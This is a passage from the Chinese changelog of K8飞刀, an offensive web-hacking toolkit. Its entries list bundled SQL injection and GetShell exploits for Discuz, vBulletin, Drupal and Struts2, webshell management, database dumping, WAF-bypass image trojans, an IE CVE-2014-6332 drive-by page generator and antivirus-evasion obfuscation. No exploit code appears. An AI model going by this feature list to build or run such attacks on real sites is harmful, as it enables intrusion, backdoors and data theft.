全版本SQL注入EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150311<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Discuz! 7.2 faq.php注入爆表前缀EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150311<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vBulletin 3 &amp; 4 ajax.php SQL注入爆管理Exploit&nbsp;&nbsp;&nbsp;&nbsp; 20150311<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ThinkPHP URL安全漏洞SQL注入爆管理员EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150311<br>[+]GoogleHack&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 新增GoogleHack模块,提高工作效率&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150127<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(文件下载功能)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150121<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP文件管理(无权限+禁用图标 空目录+灰色图标)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150120<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(增加Linux列目录功能)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150120<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(右键增加复制目录结构功能)&nbsp;&nbsp;&nbsp;&nbsp; 20150120<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(文件删除/列目录更新)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150116<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键发送到相关模块,相关功能优化&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150116<br>[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GET和POST提交-流文件保存功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150115<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(文件下载到服务器功能)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150115<br>=================================================================================<br>K8飞刀 20150114<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; URL编码保留Get或Post常用的=号和&amp;符 另附单独转换&nbsp;&nbsp; 20150114<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Discuz! X系列产品升级/转换漏洞 GetShell Exp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150114<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复修改EXP附加URL无法更新的bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150114<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WebShell表新增Shell类型字段,用于区分各种提交方式&nbsp; 20150112<br>[+]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 极速后台扫描(右键增加 复制选中URL 保存扫描结果)&nbsp;&nbsp; 20150109<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(文件上传功能)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150108<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Code代码(去掉代码前序号[格式(序号+空格+代码)])&nbsp;&nbsp;&nbsp; 20150107<br>[+]FixBug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复某些功能网络连接卡死的Bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150107<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善文件管理功能(密码/Ke/证书类-绿色+Key图标&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150106<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WebShell在控状态检测(以是否能执行代码为标准)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150105<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(脚本配置文件-蓝色+设置图标&nbsp;&nbsp;&nbsp; 20150101<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(常用目录-紫色目录图标显示&nbsp;&nbsp;&nbsp;&nbsp; 20150101<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(WebShell类-普通紫色+黑脸图标&nbsp; 20150101<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 完善PHP文件管理功能(提权类黑客类-高亮紫色+图标)&nbsp;&nbsp; 20141231<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复WebShell图片木马合成不支持空格路径的Bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141228<br>=================================================================================<br>K8飞刀 20141220<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 进制转换(10进制\2进制\8进制\16进制)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141220<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; File2JsHex(文件转成JS16进制 网页内嵌木马常用)&nbsp;&nbsp;&nbsp;&nbsp; 20141219<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WebShell图片木马合成(上传绕过WAF或留包含后门)&nbsp;&nbsp;&nbsp;&nbsp; 20141218<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VBS脚本随机ASCII加密解密(一秒免杀IE神洞网马)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141214<br>=================================================================================<br>K8飞刀 20141208 CSRF专版<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Post提交代码(Flash/jQuery/Flash/Python/Perl/PHP)&nbsp; 20141208<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Python Post参数 与 常规Post参数 互转(方便写EXP)&nbsp;&nbsp; 20141208<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Flash&nbsp; Post参数 与 常规Post参数 互转(XSS-CSRF用)&nbsp; 20141208<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jQuery Post参数 与 常规Post参数 互转(XSS-CSRF用)&nbsp; 20141206<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加WordPress后台主题GetShell代码 + 右键菜单美化&nbsp; 20141203<br>[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加右键复制 Web全部信息 Banner/IP/地址位置信息&nbsp;&nbsp; 20141202<br>=================================================================================<br>K8飞刀 20141130<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 选中URL可右键使用 Firefox\Chrome\IE 浏览器打开&nbsp;&nbsp;&nbsp; 20141128<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 正则截取数据(结果支持同时提取8个参数 灵活度更高)&nbsp; 20141128<br>K8飞刀 20141125 IE神洞版<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; IE神洞 MS14-065 CVE-2014-6332 网马生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141125<br>[+]XSSanalysis&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS挂马流量分析系统 未完成.. 静请期待&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141125<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP-Chr连接字符串(点号 +号)互转 WebShell常用&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141123<br>[+]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 极速后台扫描(WebShell\PHP\JSP\ASP\ASPX大量字典)&nbsp;&nbsp; 20141120<br>=================================================================================<br>K8飞刀 20141111 光棍专版<br>[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加Banner/IP/地址位置信息 美化各项配置属性&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141110<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复不能读取配置文件长字符串的BUG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141107<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 自动保存当前脱库配置信息/重起程序后自动加载&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141106<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XP不显示脱库速度/多线程脱库时不能停止的bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141106<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 注入点脱库(多线程) + 计算脱库速度&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141104<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 多行字符串 转成 C# StringBuffer代码 开发用&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141103<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 相对路径生成 Discuz 6.x/7.x代码执行漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141103<br>=================================================================================<br>K8飞刀 20141101<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 代码多行转一行 Bat逻辑命令符转成一行与反转&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141101<br>[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XP/2003 工具栏图标按钮位置调整&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141101<br>[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 支持多国语言编码 (解决不同区域返回乱码问题)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141031<br>[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 支持多国语言编码 (解决不同区域返回乱码问题)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141031<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Big5(HK)编码,修复脱库时HK繁体乱码的问题&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141030<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EXP按钮右键添加发送到DataOutput模块功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141030<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加robots.txt查看按钮(大部分网站都会有的)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141030<br>[+]ExpDebug/Exploit&nbsp;&nbsp; 禁用掉错误提示脚本&nbsp; 添加Discuz 7.2 相关EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141029<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Drupal后台PHP-Chr连接字符串 GetShell代码生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141027<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP GetShell代码 PHP-Chr连接字符串生成与反转&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141027<br>[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 界面直观 (工具栏/右键菜单/Tab头)添加相应图标&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141025<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Drupal后台 (PHP Filter)模块GetShell 代码生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141022<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 支持导入20141022版本前数据库(提示新增EXP数量)&nbsp;&nbsp;&nbsp;&nbsp; 20141022<br>[+]ExploitDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Exploit-DB模块 新增自定义 网址 附加URL 参数&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141022<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hex编码(GB2312\UTF8\Unicode)&nbsp; Hex解码GB2312&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141019<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQL注入 Hex文件路径(MSSQL) Hex文件路径(Mysql)&nbsp;&nbsp;&nbsp;&nbsp; 20141018<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 界面&nbsp; 编辑框只留一个&nbsp; 加密算法全放置右键菜单&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141017<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; drupal 7.31 SQL注入漏洞 EXP (测试 7.12 7.31)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20141017<br>[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 国庆花一天 弄K8工具当年常用时尚透明皮肤(.Net)&nbsp;&nbsp;&nbsp;&nbsp; 20141005<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加数据库(Oracle MYSQL MSSQL)4种CHAR格式解密&nbsp;&nbsp;&nbsp;&nbsp; 20140925<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 所有文本框 右键菜单增加 转大小写 转全半角功能&nbsp;&nbsp;&nbsp;&nbsp; 20140920<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加/修改WebShell 增加高级模式&nbsp; 默认简易模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140908<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Delphi互转其它代码用到&nbsp; 赋值 := 互转 =&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140824<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 各语言代码常用 转义字符双引号&nbsp; \" 互转 "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140824<br>[+]CheckUpdate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 检测最否有最新版 提示编译日期并打开URL地址&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140818<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 脱库模块 SQL注入点脱库 也可用于WebFuzzing&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140814<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复 执行EXP&nbsp; 提交UserAgent只能一次的问题&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140813<br>[+]ExploitDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复浏览器模式提交UserAgent只能一次的问题&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140813<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加 Zimbra LFI 0day exploit 本地包含漏洞&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140812<br>[+]FileManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ShellManage右键文件管理模块-PHP列目录完成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140811<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 路径常用符号互转 /转\\&nbsp; \\转/&nbsp; /转\&nbsp; \转/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140811<br>=================================================================================<br>K8飞刀 20140810<br>[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加节日提醒 (公历节日、农历节日)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140810<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Perl Cmd WebShell&nbsp;&nbsp;&nbsp; (Perl一句话木马连接)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140807<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Python Cmd WebShell&nbsp; (Python一句话木马连接)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140806<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion Cmd WebShell (CFM一句话木马连接)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140805<br>[+]ShellManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 合并数据库(支持导入菜刀数据库) 进行管理&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140805<br>[+]ShellManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复 WebShell 添加/修改提示对象已释放Bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140805<br>[+]ShellManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加 WebShell 判断是否已存在 不重复添加&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140805<br>=================================================================================<br>K8飞刀 20140731<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加Apache Struts2 S2-020 GetShell EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140731<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 空格转%20 空格转/**/(Struts2漏洞用到)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140731<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加已存在EXP 会提示EXP对应按扭名称&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140729<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 允许添加修改 EXP按钮名称较长字符串&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140729<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS常用 JS Escape默认加密与全部加密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140728<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS常用 FromCharCode专用ASCII码生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140728<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS常用 JS转义 (16进制/Unicode)字符串&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140728<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS常用 HTML实体编码(10进制/16进制)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140728<br>=================================================================================<br>K8飞刀 20140725<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加18个Fckeditor 19个Joomla 0day漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140725<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加Discuz! 7.2 faq.php 注入 0day漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140725<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Tipask 2.0 ajaxsearch URL编码注入漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140725<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 字符串转Unicode Unicode转字符串 SHA1加密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140725<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SHA加密算法系列 (SHA256 SHA384 SHA512)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140725<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键增加导入合并其它数据库的EXP数据功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140721<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Base64 支持3种编码(GB2312 UTF8 Unicode)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140721<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; URL编码支持3种编码(GB2312 UTF8 Unicode)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140721<br>[+]ShellManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键删除增加是否删除提示,免得误删Shell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140720<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键EXP按钮可删除和修改当前按钮对应EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140716<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 动态创建按钮加载对应Payload,生成漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140714<br>[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 